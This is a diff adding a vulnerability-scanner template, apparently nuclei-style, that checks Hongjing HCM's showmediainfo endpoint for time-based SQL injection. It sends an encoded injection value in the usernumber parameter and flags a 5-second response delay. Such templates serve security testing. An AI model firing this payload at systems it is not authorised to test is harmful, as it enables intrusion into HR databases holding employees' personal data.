@@ -1,0 +1,17 @@
+name: 宏景HCM-showmediainfo-SQL注入
+description: >-
+  SQL注入
+alwaysExecute: false
+timeout: 6
+matchCount: 2
+rules:
+  - method: GET
+    path: /workbench/duty/showmediainfo?kind=0&usernumber=1MV8sCtnMcsZFzLhJXUMPAATTP2HJFPAATTPVIRoUrFdir1XVNthrak35kPAATTP3HJDPAATTP&planid=1&objectid=1
+    expression:
+      status: 200
+      sleep: 5
+  - method: GET
+    path: /workbench/duty/showmediainfo?kind=0&usernumber=1MV8sCtnMcsZFzLhJXUMPAATTP2HJFPAATTPVIRoUrFdir1XVNthrak35kPAATTP3HJDPAATTP&planid=1&objectid=1
+    expression:
+      status: 200
+      sleep: 5
